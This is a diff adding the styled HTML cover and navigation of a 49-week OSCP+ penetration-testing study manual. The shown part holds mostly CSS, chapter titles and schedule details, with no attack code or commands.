@@ -1,0 +1,1252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>OSCP+ FIELD MANUAL // 49-Week Textbook — Hacker Edition v8.0</title>
+<meta name="description" content="OSCP+ Field Manual — 49-week offensive security textbook. Enumerate. Exploit. Escalate. Document.">
+<meta name="theme-color" content="#030604">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Merriweather:ital,wght@0,400;0,700;1,400&display=swap');
+
+:root{
+  --bg:#07090c; --surface:#0d1117; --surface2:#131a24; --border:#1f2937;
+  --text:#dbe4ee; --text-muted:#8b98ab; --accent:#39ff88; --accent2:#7dd3fc;
+  --green:#4ade80; --amber:#fbbf24; --red:#f87171; --cyan:#22d3ee; --violet:#a78bfa;
+  --code-bg:#05070a; --sidebar-w:272px; --topbar-h:58px; --shadow:0 10px 30px rgba(0,0,0,.45);
+  color-scheme: dark;
+}
+:root[data-theme="light"]{
+  --bg:#f4f6f9; --surface:#ffffff; --surface2:#eef1f6; --border:#dbe2ea;
+  --text:#101826; --text-muted:#5b6578; --code-bg:#0d1117;
+  --shadow:0 6px 20px rgba(20,30,50,.08);
+  color-scheme: light;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:calc(var(--topbar-h) + 14px + env(safe-area-inset-top,0px))}
+body{
+  font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);
+  line-height:1.75;font-size:16px;
+  padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);
+}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);background:var(--bg);z-index:60}
+::selection{background:rgba(57,255,136,.25);color:var(--text)}
+
+/* ===== TOPBAR ===== */
+.topbar{
+  position:fixed;top:env(safe-area-inset-top,0px);left:0;right:0;height:var(--topbar-h);z-index:50;
+  display:flex;align-items:center;gap:1rem;padding:0 1rem;
+  background:rgba(7,9,12,.88);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);
+}
+:root[data-theme="light"] .topbar{background:rgba(255,255,255,.88)}
+.topbar-brand{display:flex;align-items:center;gap:.6rem;font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.92rem;letter-spacing:.02em;color:var(--text);text-decoration:none;white-space:nowrap}
+.topbar-brand .dot{width:9px;height:9px;border-radius:50%;background:var(--accent);box-shadow:0 0 10px var(--accent);flex:none}
+.topbar-brand small{color:var(--text-muted);font-weight:500;display:none}
+.burger{display:none;background:none;border:1px solid var(--border);color:var(--text);border-radius:8px;width:36px;height:36px;font-size:1.1rem;cursor:pointer}
+.search-wrap{flex:1;max-width:420px;position:relative;margin-left:.5rem}
+.search-wrap input{
+  width:100%;background:var(--surface);border:1px solid var(--border);color:var(--text);
+  border-radius:8px;padding:.5rem .8rem .5rem 2.1rem;font-size:.85rem;font-family:'JetBrains Mono',monospace;
+}
+.search-wrap input:focus{outline:none;border-color:var(--accent)}
+.search-wrap::before{content:"⌕";position:absolute;left:.7rem;top:50%;transform:translateY(-50%);color:var(--text-muted);font-size:1rem}
+.topbar-actions{display:flex;align-items:center;gap:.5rem;margin-left:auto}
+.icon-btn{
+  background:var(--surface);border:1px solid var(--border);color:var(--text-muted);
+  border-radius:8px;height:36px;padding:0 .8rem;font-size:.78rem;font-family:'JetBrains Mono',monospace;
+  cursor:pointer;display:flex;align-items:center;gap:.4rem;text-decoration:none;
+}
+.icon-btn:hover{color:var(--text);border-color:var(--accent)}
+.progress{position:fixed;top:calc(var(--topbar-h) + env(safe-area-inset-top,0px));left:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2));z-index:51;width:0%;transition:width .08s linear}
+
+/* ===== SIDEBAR ===== */
+.sidebar{
+  position:fixed;top:calc(var(--topbar-h) + env(safe-area-inset-top,0px));left:0;bottom:0;width:var(--sidebar-w);
+  background:var(--surface);border-right:1px solid var(--border);overflow-y:auto;padding:1.1rem .9rem 2rem;z-index:40;
+}
+.sidebar::-webkit-scrollbar{width:6px} .sidebar::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+.side-label{font-family:'JetBrains Mono',monospace;font-size:.68rem;letter-spacing:.14em;text-transform:uppercase;color:var(--text-muted);margin:1.1rem .5rem .5rem}
+.side-label:first-child{margin-top:0}
+.side-link{
+  display:flex;align-items:center;gap:.6rem;padding:.55rem .6rem;border-radius:8px;color:var(--text-muted);
+  text-decoration:none;font-size:.85rem;font-weight:500;line-height:1.3;
+}
+.side-link .n{font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--accent);min-width:1.6rem;font-weight:700}
+.side-link:hover{background:var(--surface2);color:var(--text)}
+.side-link.active{background:rgba(57,255,136,.1);color:var(--text);box-shadow:inset 2px 0 0 var(--accent)}
+.sidebar-backdrop{display:none}
+
+/* ===== LAYOUT ===== */
+.content{margin-left:var(--sidebar-w);padding-top:calc(var(--topbar-h) + env(safe-area-inset-top,0px))}
+.book-container{max-width:900px;margin:0 auto;padding:0 2rem 6rem}
+
+/* ===== COVER ===== */
+.cover{min-height:68vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;
+  background:radial-gradient(circle at 50% 10%,rgba(57,255,136,.08) 0%,transparent 60%),var(--bg);
+  padding:4rem 2rem;border-bottom:1px solid var(--border);position:relative;overflow:hidden}
+.cover::after{content:"";position:absolute;inset:0;background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);background-size:42px 42px;opacity:.12;pointer-events:none}
+.cover-badge{display:inline-flex;align-items:center;gap:.5rem;padding:.4rem 1.1rem;border:1px solid rgba(57,255,136,.35);border-radius:100px;font-family:'JetBrains Mono',monospace;font-size:.72rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.75rem;background:rgba(57,255,136,.08)}
+.cover h1{font-size:clamp(2.1rem,5vw,3.6rem);font-weight:900;letter-spacing:-.02em;line-height:1.14;margin-bottom:1.4rem;color:#fff}
+:root[data-theme="light"] .cover h1{color:#0b1220}
+.cover-sub{font-size:1.05rem;color:var(--text-muted);max-width:720px;line-height:1.8;margin-bottom:2.5rem}
+.cover-meta{display:flex;gap:1.2rem;flex-wrap:wrap;justify-content:center}
+.cover-meta-item{text-align:center;padding:1rem 1.5rem;background:var(--surface);border:1px solid var(--border);border-radius:10px;min-width:110px}
+.cover-meta-item .num{font-size:1.7rem;font-weight:800;color:var(--accent);font-family:'JetBrains Mono',monospace}
+.cover-meta-item .label{font-size:.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.09em;margin-top:.25rem}
+.cover-cta{margin-top:2.4rem}
+.cover-cta a{display:inline-block;padding:.85rem 2.2rem;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#05170c;text-decoration:none;border-radius:9px;font-weight:800;font-size:.92rem;letter-spacing:.02em}
+
+/* ===== TOC GRID ===== */
+.toc-section{padding:3.5rem 0 1.5rem}
+.toc-section h2{font-size:1.5rem;font-weight:800;margin-bottom:1.2rem}
+.toc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:.65rem}
+.toc-item{display:flex;align-items:center;gap:.9rem;padding:.9rem 1.1rem;background:var(--surface);border:1px solid var(--border);border-radius:10px;text-decoration:none;color:var(--text)}
+.toc-item:hover{background:var(--surface2);border-color:var(--accent)}
+.toc-num{font-family:'JetBrains Mono',monospace;font-size:.85rem;font-weight:700;color:var(--accent);min-width:2rem}
+.toc-title{font-weight:600;font-size:.9rem}
+.toc-sub{font-size:.76rem;color:var(--text-muted);margin-top:.1rem}
+
+/* ===== CHAPTERS ===== */
+.chapter{margin-top:4.5rem;padding-top:3rem;border-top:1px solid var(--border);scroll-margin-top:calc(var(--topbar-h) + 20px)}
+.chapter-label{font-family:'JetBrains Mono',monospace;font-size:.72rem;font-weight:700;letter-spacing:.18em;text-transform:uppercase;color:var(--accent);margin-bottom:.4rem}
+.chapter h2{font-size:1.9rem;font-weight:800;letter-spacing:-.015em;line-height:1.22;margin-bottom:.9rem;color:#fff}
+:root[data-theme="light"] .chapter h2,:root[data-theme="light"] h2,:root[data-theme="light"] h3{color:#0b1220}
+.chapter-desc{font-size:1rem;color:var(--text-muted);max-width:780px;line-height:1.8;margin-bottom:1.7rem}
+
+h2,h3,h4{color:#fff}
+h3{font-size:1.3rem;font-weight:700;margin:2.2rem 0 .9rem;padding-bottom:.45rem;border-bottom:1px solid var(--border)}
+h4{font-size:1.05rem;font-weight:700;margin:1.4rem 0 .6rem;color:var(--accent2)}
+p{margin-bottom:1.05rem;color:var(--text)}
+ul,ol{margin:0 0 1.15rem 1.5rem}
+li{margin-bottom:.45rem}
+strong{color:#fff}
+:root[data-theme="light"] strong{color:#0b1220}
+a{color:var(--accent2)}
+
+/* ===== THEORY BOX ===== */
+.theory-box{background:rgba(125,211,252,.05);border:1px solid var(--border);border-left:4px solid var(--accent2);border-radius:10px;padding:1.3rem 1.6rem;margin:1.4rem 0;font-family:'Merriweather',Georgia,serif;font-size:.93rem;line-height:1.85}
+.theory-box-title{font-family:'Inter',sans-serif;font-size:.76rem;font-weight:800;text-transform:uppercase;letter-spacing:.1em;color:var(--accent2);margin-bottom:.65rem}
+
+/* ===== CALLOUTS ===== */
+.callout{padding:1.1rem 1.4rem;border-radius:10px;margin:1.4rem 0;font-size:.9rem;line-height:1.65;border-left:4px solid;background:var(--surface)}
+.callout.info{border-color:var(--cyan)} .callout.warning{border-color:var(--amber)}
+.callout.danger{border-color:var(--red)} .callout.success{border-color:var(--green)}
+.callout-title{font-weight:800;font-size:.76rem;text-transform:uppercase;letter-spacing:.07em;margin-bottom:.4rem;display:block}
+
+/* ===== CODE ===== */
+.cmd-block{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:.9rem 0 1.4rem;font-family:'JetBrains Mono',monospace;font-size:.8rem;line-height:1.75;overflow-x:auto;color:#86efac;white-space:pre-wrap}
+.cmd-block .comment{color:#64748b;font-style:italic}
+code{font-family:'JetBrains Mono',monospace;background:var(--surface2);padding:.12rem .4rem;border-radius:4px;font-size:.84em;color:var(--accent)}
+
+/* ===== TABLES ===== */
+.table-wrap{overflow-x:auto;margin:1.3rem 0;border:1px solid var(--border);border-radius:10px}
+table{width:100%;border-collapse:collapse;font-size:.85rem;min-width:560px}
+th{background:var(--surface2);text-align:left;padding:.75rem 1rem;font-weight:700;color:var(--accent2);border-bottom:1px solid var(--border);white-space:nowrap}
+td{padding:.7rem 1rem;border-bottom:1px solid var(--border);color:var(--text-muted);vertical-align:top}
+tr:last-child td{border-bottom:none}
+
+/* ===== PHASE BANNER ===== */
+.phase-banner{text-align:center;background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:2.2rem 1.5rem;margin-bottom:2.2rem}
+.phase-num{font-family:'JetBrains Mono',monospace;font-size:.78rem;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:.5rem}
+.phase-banner h2{font-size:1.6rem;font-weight:800;margin-bottom:.5rem;color:#fff}
+.phase-banner p{color:var(--text-muted);font-size:.95rem;max-width:640px;margin:0 auto}
+
+.back-top{display:inline-block;margin-top:1.4rem;font-size:.8rem;color:var(--text-muted);text-decoration:none;font-family:'JetBrains Mono',monospace}
+.back-top:hover{color:var(--accent)}
+
+/* ===== WEEK CARDS ===== */
+.week-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.5rem 1.6rem;margin:1.3rem 0}
+.week-card-header{display:flex;align-items:center;gap:.9rem;flex-wrap:wrap;margin-bottom:.5rem}
+.week-card-header h4{margin:0;color:#fff}
+.week-goal{color:var(--text-muted);font-size:.92rem;margin-bottom:1rem}
+.week-badge{font-family:'JetBrains Mono',monospace;font-size:.72rem;font-weight:700;padding:.3rem .7rem;border-radius:6px;background:rgba(57,255,136,.12);color:var(--accent);white-space:nowrap}
+.week-badge.amber{background:rgba(251,191,36,.12);color:var(--amber)}
+.week-badge.cyan{background:rgba(34,211,238,.12);color:var(--cyan)}
+.week-badge.green{background:rgba(74,222,128,.12);color:var(--green)}
+.week-badge.purple{background:rgba(167,139,250,.12);color:var(--violet)}
+.week-badge.red{background:rgba(248,113,113,.12);color:var(--red)}
+
+.checklist{list-style:none;margin-left:0}
+.checklist li{position:relative;padding-left:1.7rem}
+.checklist li::before{content:"▸";position:absolute;left:0;color:var(--accent);font-weight:700}
+
+.ref-box{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1rem 1.3rem;margin:1.2rem 0;font-size:.85rem;color:var(--text-muted)}
+
+/* ===== BACK TO TOP FAB ===== */
+.fab{position:fixed;right:1.3rem;bottom:calc(1.3rem + env(safe-area-inset-bottom,0px));width:42px;height:42px;border-radius:50%;background:var(--accent);color:#05170c;border:none;font-size:1.1rem;cursor:pointer;box-shadow:var(--shadow);display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .2s;z-index:45}
+.fab.show{opacity:1;pointer-events:auto}
+
+mark{background:rgba(57,255,136,.35);color:inherit;border-radius:3px}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width:960px){
+  .sidebar{transform:translateX(-100%);transition:transform .22s ease;box-shadow:var(--shadow)}
+  .sidebar.open{transform:translateX(0)}
+  .content{margin-left:0}
+  .burger{display:flex;align-items:center;justify-content:center}
+  .sidebar-backdrop{display:none;position:fixed;inset:0;top:calc(var(--topbar-h) + env(safe-area-inset-top,0px));background:rgba(0,0,0,.5);z-index:39}
+  .sidebar-backdrop.show{display:block}
+  .toc-grid{grid-template-columns:1fr}
+  .topbar-brand small{display:none}
+}
+@media (min-width:640px){.topbar-brand small{display:inline;color:var(--text-muted);font-weight:500}}
+@media (max-width:640px){.book-container{padding:0 1.1rem 4rem}.cover{padding:3rem 1.2rem}}
+
+/* ===== SCROLL REVEAL ===== */
+.reveal{opacity:0;transform:translateY(22px);transition:opacity .6s cubic-bezier(.2,.7,.3,1),transform .6s cubic-bezier(.2,.7,.3,1)}
+.reveal.in{opacity:1;transform:translateY(0)}
+
+/* ===== HERO ANIMATED BG ===== */
+.cover{position:relative}
+.hero-canvas{position:absolute;inset:0;z-index:0;opacity:.35;pointer-events:none}
+.cover-badge,.cover h1,.cover-sub,.cover-meta,.cover-cta{position:relative;z-index:1}
+.cover h1{background:linear-gradient(100deg,#fff 10%,var(--accent) 45%,var(--accent2) 65%,#fff 90%);background-size:220% auto;-webkit-background-clip:text;background-clip:text;color:transparent;animation:shine 7s linear infinite}
+:root[data-theme="light"] .cover h1{background:linear-gradient(100deg,#0b1220 10%,#0a8a4a 45%,#0369a1 65%,#0b1220 90%);background-size:220% auto;-webkit-background-clip:text;background-clip:text;color:transparent}
+@keyframes shine{to{background-position:-220% center}}
+.typed-line{font-family:'JetBrains Mono',monospace;font-size:.95rem;color:var(--accent);min-height:1.4em;margin-bottom:1.1rem}
+.typed-line::after{content:"▌";animation:blink 1s step-end infinite;margin-left:2px}
+@keyframes blink{50%{opacity:0}}
+.cover-meta-item .num{display:inline-block}
+
+/* ===== CARD HOVER / GLOW ===== */
+.week-card,.toc-item,.cover-meta-item,.theory-box,.callout,.phase-banner,.ref-box{transition:transform .25s ease,box-shadow .25s ease,border-color .25s ease}
+.week-card:hover,.toc-item:hover{transform:translateY(-3px);box-shadow:0 14px 30px rgba(0,0,0,.35),0 0 0 1px rgba(57,255,136,.25)}
+:root[data-theme="light"] .week-card:hover,:root[data-theme="light"] .toc-item:hover{box-shadow:0 14px 30px rgba(20,30,50,.12),0 0 0 1px rgba(10,138,74,.25)}
+.cover-meta-item:hover{transform:translateY(-3px);border-color:var(--accent)}
+
+/* ===== SYLLABUS MAP TABLE ===== */
+.syllabus-map{margin:1.4rem 0}
+.syllabus-row{display:grid;grid-template-columns:28px 1fr 160px;gap:1rem;align-items:center;padding:.8rem 1rem;border-bottom:1px solid var(--border)}
+.syllabus-row:last-child{border-bottom:none}
+.syllabus-row .sm-num{font-family:'JetBrains Mono',monospace;color:var(--accent);font-weight:700;font-size:.8rem}
+.syllabus-row .sm-title{font-weight:600;font-size:.9rem}
+.syllabus-row .sm-desc{font-size:.8rem;color:var(--text-muted);margin-top:.15rem}
+.syllabus-row .sm-week{font-family:'JetBrains Mono',monospace;font-size:.72rem;text-align:right;color:var(--accent2);white-space:nowrap}
+.sm-flag{display:inline-block;margin-top:.3rem;font-size:.68rem;padding:.12rem .5rem;border-radius:5px;background:rgba(248,113,113,.12);color:var(--red);font-family:'JetBrains Mono',monospace}
+
+/* ===== SIDEBAR ACTIVE GLOW ===== */
+.side-link.active{position:relative}
+.side-link.active::after{content:"";position:absolute;left:-1px;top:0;bottom:0;width:2px;background:var(--accent);box-shadow:0 0 8px var(--accent)}
+
+/* ===== FAB PULSE ===== */
+.fab{animation:none}
+.fab.show{animation:fabIn .25s ease}
+@keyframes fabIn{from{transform:scale(.7);opacity:0}to{transform:scale(1);opacity:1}}
+
+@media (prefers-reduced-motion:reduce){
+  .reveal{opacity:1;transform:none;transition:none}
+  .cover h1{animation:none}
+  .typed-line::after{animation:none}
+}
+
+</style>
+
+<style id="hacker-edition-v8">
+/* ============ OSCP HACKER EDITION v8 — UI/UX Pro Max: Cyberpunk UI + Terminal CLI ============ */
+:root{
+  --bg:#030604; --surface:#070b08; --surface2:#0b120d; --border:#1d2f22;
+  --text:#d7e8dc; --text-muted:#7d9484; --accent:#00ff66; --accent2:#00e5ff;
+  --green:#00ff66; --amber:#ffb000; --red:#ff3355; --cyan:#00e5ff; --violet:#b18cff;
+  --code-bg:#020403; --shadow:0 0 0 1px rgba(0,255,102,.06),0 18px 40px rgba(0,0,0,.65);
+}
+:root[data-theme="light"]{ --bg:#eef2ee; --surface:#fff; --surface2:#e6ece6; --border:#c3d2c6; --text:#0a140c; --text-muted:#43584a; --code-bg:#071008; --shadow:0 10px 28px rgba(10,40,20,.12); }
+*{border-radius:0!important}
+::selection{background:#00ff66;color:#021106}
+html{scrollbar-color:#00ff66 #050805}
+::-webkit-scrollbar{width:10px;height:10px}::-webkit-scrollbar-track{background:#050805}
+::-webkit-scrollbar-thumb{background:#123d22;border:2px solid #050805}::-webkit-scrollbar-thumb:hover{background:#00ff66}
+body{font-family:'Inter',system-ui,sans-serif;background:
+  linear-gradient(rgba(0,255,102,.028) 1px,transparent 1px),
+  linear-gradient(90deg,rgba(0,255,102,.028) 1px,transparent 1px),var(--bg);
+  background-size:44px 44px,44px 44px,auto}
+:root[data-theme="light"] body{background:var(--bg)}
+/* scanlines — dark only, pointer-transparent, killed by reduced-motion below */
+body::after{content:"";position:fixed;inset:0;z-index:200;pointer-events:none;opacity:.05;
+  background:repeating-linear-gradient(0deg,transparent 0 2px,rgba(0,255,102,.5) 2px 3px)}
+:root[data-theme="light"] body::after{display:none}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+/* topbar */
+.topbar{background:rgba(3,6,4,.94);border-bottom:1px solid #00ff66;box-shadow:0 1px 0 rgba(0,255,102,.25),0 10px 30px rgba(0,0,0,.5)}
+:root[data-theme="light"] .topbar{background:rgba(255,255,255,.94)}
+.topbar-brand{font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.06em}
+.topbar-brand .dot{border-radius:0!important;transform:rotate(45deg);animation:hudblink 1.6s steps(2) infinite}
+@keyframes hudblink{50%{opacity:.35}}
+.search-wrap input{font-family:'JetBrains Mono',monospace;background:#020403;color:#c9ffd9;border-color:#23402e}
+.search-wrap input:focus{border-color:#00ff66;box-shadow:0 0 0 1px #00ff66,0 0 18px rgba(0,255,102,.25)}
+.search-wrap::before{content:">_";font-family:'JetBrains Mono',monospace;font-size:.78rem;color:#00ff66}
+.progress{background:linear-gradient(90deg,#00ff66,#00e5ff);box-shadow:0 0 12px rgba(0,255,102,.8);height:3px}
+.icon-btn,.burger{font-family:'JetBrains Mono',monospace;border-color:#23402e;min-height:44px;min-width:44px}
+.icon-btn:hover,.burger:hover{border-color:#00ff66;color:#00ff66}
+/* sidebar */
+.sidebar{background:#040704;border-right:1px solid #1d2f22}
+.side-label{font-family:'JetBrains Mono',monospace;letter-spacing:.18em;color:#00ff66;text-transform:uppercase}
+.side-label::before{content:"// "}
+.side-link{font-family:'JetBrains Mono',monospace;font-size:.82rem;border-left:2px solid transparent;transition:background 180ms ease-out,color 180ms ease-out,border-color 180ms ease-out}
+.side-link .n{color:#00ff66;font-weight:700}
+.side-link:hover{background:#0a140c;color:#fff}
+.side-link.active{background:#00ff66;color:#021106;border-left-color:#00e5ff}
+.side-link.active .n{color:#021106}
+/* cover / hero */
+.cover{position:relative;border-bottom:1px solid #1d2f22;background:radial-gradient(900px 420px at 50% -80px,rgba(0,255,102,.13),transparent 65%)}
+.hud-strip{display:flex;flex-wrap:wrap;gap:.5rem 1.4rem;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:.68rem;letter-spacing:.16em;color:#8fe8ab;border:1px solid #1d2f22;background:rgba(2,4,3,.72);padding:.55rem 1rem;margin:0 auto 1.4rem;max-width:860px}
+.hud-dot{display:inline-block;width:7px;height:7px;background:#00ff66;box-shadow:0 0 10px #00ff66;margin-right:.45rem;animation:hudblink 1.2s steps(2) infinite}
+.cover-badge{font-family:'JetBrains Mono',monospace;background:#020403;color:#00ff66;border:1px solid #00ff66;box-shadow:0 0 18px rgba(0,255,102,.22);letter-spacing:.04em}
+.cover h1{font-family:'JetBrains Mono',monospace;font-weight:800;text-transform:uppercase;letter-spacing:-.01em;line-height:1.12;color:#eafff0;text-shadow:0 0 26px rgba(0,255,102,.28)}
+:root[data-theme="light"] .cover h1{color:#0a140c;text-shadow:none}
+.glitch{position:relative}
+.glitch::before,.glitch::after{content:attr(data-text);position:absolute;left:0;top:0;width:100%;overflow:hidden;pointer-events:none;opacity:0}
+.glitch::before{color:#00e5ff}.glitch::after{color:#ff3355}
+.glitch:hover::before{opacity:.75;animation:gl1 .28s steps(2) both}
+.glitch:hover::after{opacity:.75;animation:gl2 .28s steps(2) both}
+@keyframes gl1{0%{transform:translate(-3px,0)}50%{transform:translate(2px,-1px)}100%{transform:translate(0)}}
+@keyframes gl2{0%{transform:translate(3px,0)}50%{transform:translate(-2px,1px)}100%{transform:translate(0)}}
+.typed-line{font-family:'JetBrains Mono',monospace;color:#00ff66}
+.typed-line::after{content:"▌";animation:hudblink 1s steps(1) infinite;color:#00ff66}
+.cover-sub{color:var(--text-muted)}
+.cover-meta-item{background:#050a06;border:1px solid #23402e;box-shadow:inset 0 0 0 1px rgba(0,255,102,.05);transition:transform 200ms ease-out,border-color 200ms ease-out,box-shadow 200ms ease-out}
+.cover-meta-item:hover{transform:translateY(-3px);border-color:#00ff66;box-shadow:0 0 22px rgba(0,255,102,.22)}
+.cover-meta-item .num{font-family:'JetBrains Mono',monospace;color:#00ff66;font-variant-numeric:tabular-nums}
+.cover-meta-item .label{font-family:'JetBrains Mono',monospace;letter-spacing:.14em;text-transform:uppercase}
+.cover-cta a{font-family:'JetBrains Mono',monospace;background:#00ff66;color:#021106;border:1px solid #00ff66;font-weight:700;letter-spacing:.08em;box-shadow:0 0 26px rgba(0,255,102,.35);transition:transform 180ms ease-out,box-shadow 180ms ease-out}
+.cover-cta a:hover{transform:translateY(-2px);box-shadow:0 0 38px rgba(0,255,102,.55)}
+/* terminal window */
+.term-window{max-width:640px;margin:2rem auto 0;text-align:left;background:#020403;border:1px solid #23402e;box-shadow:0 18px 44px rgba(0,0,0,.6),0 0 24px rgba(0,255,102,.12);font-family:'JetBrains Mono',monospace}
+.term-head{display:flex;align-items:center;gap:.45rem;padding:.55rem .8rem;border-bottom:1px solid #1d2f22;background:#050a06}
+.term-head span{width:11px;height:11px;border:1px solid #33523c}
+.term-head span:nth-child(1){background:#ff3355}.term-head span:nth-child(2){background:#ffb000}.term-head span:nth-child(3){background:#00ff66}
+.term-head em{font-style:normal;margin-left:.5rem;font-size:.72rem;color:#7d9484}
+.term-body{padding:.9rem 1rem;font-size:.8rem;line-height:1.7;color:#c9ffd9}
+.term-body b{color:#00ff66}.term-dim{color:#637a69}
+.term-cursor{display:inline-block;width:8px;height:1em;background:#00ff66;vertical-align:-2px;animation:hudblink 1s steps(1) infinite}
+/* content */
+.content h2,.chapter h2{font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.01em}
+.content h3{font-family:'JetBrains Mono',monospace}
+.content h2::before{content:">_ ";color:#00ff66}
+.toc-item,.week-card,.theory-box,.callout,.ref-box,.phase-banner,.table-wrap{border-color:#223c2a;background:var(--surface)}
+.toc-item{transition:transform 180ms ease-out,border-color 180ms ease-out,box-shadow 180ms ease-out}
+.toc-item:hover{transform:translate(-2px,-2px);border-color:#00ff66;box-shadow:4px 4px 0 rgba(0,255,102,.35)}
+.toc-num{font-family:'JetBrains Mono',monospace;color:#021106;background:#00ff66;font-weight:800;padding:.15rem .4rem}
+code,pre,kbd{font-family:'JetBrains Mono',monospace}
+code{background:#020403;color:#7dffab;border:1px solid #1d2f22;padding:.08em .35em}
+pre{background:#020403!important;border:1px solid #23402e;border-left:3px solid #00ff66;color:#c9ffd9;box-shadow:inset 0 0 30px rgba(0,255,102,.04)}
+table th{font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.08em;background:#07130a;color:#00ff66;font-size:.74rem}
+table td{font-variant-numeric:tabular-nums}
+mark{background:#00ff66;color:#021106;padding:0 .15em}
+.fab{background:#00ff66;color:#021106;border:1px solid #00ff66;box-shadow:0 0 22px rgba(0,255,102,.4);font-family:'JetBrains Mono',monospace;min-width:44px;min-height:44px}
+.back-top{font-family:'JetBrains Mono',monospace;color:#00ff66}
+a{color:#35d0ff}:root[data-theme="light"] a{color:#00695c}
+.chapter,.week-card{transition:border-color 200ms ease-out}
+.chapter:hover,.week-card:hover{border-color:#2c5238}
+@media(max-width:900px){.hud-hide{display:none}.term-window{margin-left:.5rem;margin-right:.5rem}}
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation:none!important;transition:none!important}
+  body::after{display:none} html{scroll-behavior:auto}
+}
+</style>
+
+</head>
+<body>
+<header class="topbar">
+  <button class="burger" id="burger" aria-label="Toggle navigation">&#9776;</button>
+  <a class="topbar-brand" href="#top"><span class="dot"></span>OSCP+ FIELD MANUAL<small>&nbsp;// v8.0 HACKER EDITION</small></a>
+  <div class="search-wrap"><input id="search" type="text" placeholder="Search the book... (e.g. kerberoast)"></div>
+  <div class="topbar-actions">
+    <button class="icon-btn" id="themeToggle">&#9728; Light</button>
+  </div>
+</header>
+<div class="progress" id="progress"></div>
+<nav class="sidebar" id="sidebar">
+  <div class="side-label">Navigate</div>
+  <a class="side-link" href="#top"><span class="n">&uarr;</span><span>Cover</span></a>
+  <div class="side-label">Chapters</div>
+  <a class="side-link" href="#ch0"><span class="n">00</span><span>How Computers & Networks Work</span></a>
+<a class="side-link" href="#ch1"><span class="n">01</span><span>The 49-Week Master Plan</span></a>
+<a class="side-link" href="#ch2"><span class="n">02</span><span>Exam Rules, Scoring & Budget</span></a>
+<a class="side-link" href="#ch3"><span class="n">03</span><span>Lab Setup & Core Mechanics</span></a>
+<a class="side-link" href="#ch4"><span class="n">04</span><span>Two Tracks: Dev vs Beginner</span></a>
+<a class="side-link" href="#ch5"><span class="n">05</span><span>Phase 0 — Foundations (Wk 1-12)</span></a>
+<a class="side-link" href="#ch6"><span class="n">06</span><span>Phase 1A — Recon, Web, SQLi (Wk 13-19)</span></a>
+<a class="side-link" href="#ch7"><span class="n">07</span><span>Phase 1B — Privilege Escalation (Wk 20-23)</span></a>
+<a class="side-link" href="#ch8"><span class="n">08</span><span>Phase 1C/1D — Pivot, Metasploit, AD (Wk 24-35)</span></a>
+<a class="side-link" href="#ch9"><span class="n">09</span><span>Week 36 Gate & Paid Window (Wk 36-49)</span></a>
+<a class="side-link" href="#ch11"><span class="n">10</span><span>Official Syllabus Cross-Check</span></a>
+<a class="side-link" href="#ch10"><span class="n">11</span><span>Exam Day & Bibliography</span></a>
+</nav>
+<div class="sidebar-backdrop" id="backdrop"></div>
+<main class="content">
+
+
+<div class="cover" id="top">
+<canvas class="hero-canvas" id="heroCanvas"></canvas>
+  <div class="hud-strip" aria-hidden="true"><span><i class="hud-dot"></i>SYS: ONLINE</span><span>TARGET: OSCP+</span><span>MODE: OFFENSIVE OPS</span><span>CLEARANCE: ROOT</span><span class="hud-hide">UPTIME: 49 WEEKS</span></div>
+  <div class="cover-badge">root@kali:~# ./field-manual --edition=definitive --weeks=49</div>
+  <h1 class="glitch" data-text="The Complete OSCP+ Textbook">The Complete OSCP+ Textbook<br>From Zero IT Knowledge to Exam-Ready</h1>
+  <div class="typed-line" id="typedLine"></div>
+<p class="cover-sub">A beginner-safe 49-week textbook and operational roadmap for two brothers (one Flutter developer, one starting from scratch) at 10–14 hours per week. Build your foundation and master every tested PEN-200 module for $0 across Weeks 1–31, run a $19 Proving Grounds Practice sprint and 24-hour Gate Mock Exam in Weeks 32–36, and finish in a 13-week PEN-200 paid window.</p>
+  <div class="cover-meta">
+    <div class="cover-meta-item"><div class="num">49</div><div class="label">Total Weeks</div></div>
+    <div class="cover-meta-item"><div class="num">10–14</div><div class="label">Hours / Week</div></div>
+    <div class="cover-meta-item"><div class="num">$19</div><div class="label">Pre-Gate Mock Cost</div></div>
+    <div class="cover-meta-item"><div class="num">70/100</div><div class="label">Pass Score</div></div>
+  </div>
+  <div class="cover-cta"><a href="#toc">[ OPEN TEXTBOOK ] ↓</a></div>
